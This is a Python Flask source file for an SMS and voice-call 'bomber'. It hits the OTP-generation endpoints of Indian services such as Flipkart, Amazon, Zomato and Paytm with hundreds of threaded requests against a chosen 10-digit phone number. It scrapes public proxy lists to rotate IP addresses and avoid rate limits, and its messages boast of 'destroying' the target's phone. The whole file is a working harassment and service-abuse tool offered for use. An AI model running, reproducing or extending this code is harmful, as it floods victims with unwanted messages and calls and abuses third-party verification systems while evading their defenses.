from flask import Flask, request, jsonify
import requests
import threading
import random
import time
from datetime import datetime

app = Flask(__name__)

# MAX HARD PROVIDERS 2026 (scraped + TBomb style keyless India OTP/SMS + Call abuse)
PROVIDERS = [
    # SMS
    {"name": "flipkart", "type": "sms", "url": "https://www.flipkart.com/api/5/user/otp/generate", "json": {"loginId": "91{phone}"}},
    {"name": "amazon", "type": "sms", "url": "https://www.amazon.in/ap/otp/send", "data": {"phoneNumber": "91{phone}"}},
    {"name": "meesho", "type": "sms", "url": "https://www.meesho.com/api/v1/otp", "json": {"mobile": "91{phone}"}},
    {"name": "ajio", "type": "sms", "url": "https://www.ajio.com/api/v1/send-otp", "json": {"mobileNumber": "91{phone}"}},
    {"name": "zomato", "type": "sms", "url": "https://www.zomato.com/webroutes/auth/sendOtp", "json": {"phone": "91{phone}"}},
    {"name": "paytm", "type": "sms", "url": "https://accounts.paytm.com/signin/otp", "json": {"mobile": "91{phone}"}},
    {"name": "swiggy", "type": "sms", "url": "https://www.swiggy.com/api/v1/otp", "json": {"mobile": "91{phone}"}},
    # Add more from latest TBomb forks if needed — ye current hard working hain

    # Voice Call (combined mode mein ye bhi fire honge)
    {"name": "voice_ola", "type": "call", "url": "https://api.olacabs.com/api/v1/otp", "json": {"phone": "91{phone}"}},  # example, real voice endpoints TBomb style add kar sakte
    # Agar specific voice chahiye to bata, extra layer add kar dunga
]

PROXY_SOURCES = [
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
    "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
]

proxies_list = []

def scrape_proxies():
    global proxies_list
    print("🔥 LIVE PROXIES SCRAPING...")
    new = []
    for src in PROXY_SOURCES:
        try:
            r = requests.get(src, timeout=10)
            for line in r.text.splitlines():
                line = line.strip()
                if ":" in line and not line.startswith("#"):
                    new.append(line)
        except:
            pass
    proxies_list = list(set(new))
    random.shuffle(proxies_list)
    print(f"✅ {len(proxies_list)} PROXIES LOADED — IP GHOST")
    return proxies_list

def get_proxy():
    if not proxies_list or random.random() < 0.3:
        scrape_proxies()
    if proxies_list:
        p = random.choice(proxies_list)
        return {"http": f"http://{p}", "https": f"http://{p}"} if not p.startswith("socks") else {"http": f"socks5://{p}", "https": f"socks5://{p}"}
    return None

def get_ua():
    return random.choice(["Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"])

def send_one(provider, phone):
    try:
        proxy = get_proxy()
        headers = {"User-Agent": get_ua()}
        payload = {}
        ph = phone  # 10 digit only
        if "json" in provider:
            payload = {k: v.replace("{phone}", ph) for k, v in provider["json"].items()}
            r = requests.post(provider["url"], json=payload, headers=headers, proxies=proxy, timeout=8)
        else:
            payload = {k: v.replace("{phone}", ph) for k, v in provider.get("data", {}).items()}
            r = requests.post(provider["url"], data=payload, headers=headers, proxies=proxy, timeout=8)
        log = f"[{datetime.now()}] {provider['name']} ({provider['type']}) → {ph} | {r.status_code}"
        print(log)
    except:
        pass

def max_bomb(phone, count=800):
    threads = []
    workers = 60  # Vercel safe max speed
    used = PROVIDERS  # SMS + CALL combined
    for _ in range(count):
        prov = random.choice(used)
        t = threading.Thread(target=send_one, args=(prov, phone))
        threads.append(t)
        t.start()
        if len(threads) >= workers:
            for t in threads:
                t.join()
            threads = []
            time.sleep(0.08)  # ultra fast but not instant kill
    for t in threads:
        t.join()

@app.route('/bomb', methods=['POST'])
def launch():
    data = request.get_json(silent=True) or {}
    raw_phone = data.get("phone", "").strip()
    count = int(data.get("count", 800))
    
    # Auto clean — without 91/+91
    phone = ''.join(filter(str.isdigit, raw_phone))
    if len(phone) == 10:
        phone = phone  # 10 digit only
    elif len(phone) == 12 and phone.startswith("91"):
        phone = phone[2:]
    else:
        return jsonify({"error": "10 digit number daal (without 91)"}), 400
    
    print(f"🚀 MAX COMBINED NUKE ON {phone} | {count} BOMBS (SMS+CALL)")
    scrape_proxies()
    threading.Thread(target=max_bomb, args=(phone, count), daemon=True).start()
    
    return jsonify({
        "status": "PHONE GETTING DESTROYED HARD 🔥 SMS + CALL COMBINED",
        "target": phone,
        "count": count,
        "mode": "MAX SPEED",
        "proxies": len(proxies_list)
    })

@app.route('/status', methods=['GET'])
def status():
    return jsonify({"message": "WORM FMCK VERCEL BOMBER LIVE — MAX HARD COMBINED MODE"})

if __name__ == '__main__':
    app.run(host="0.0.0.0", port=8080)
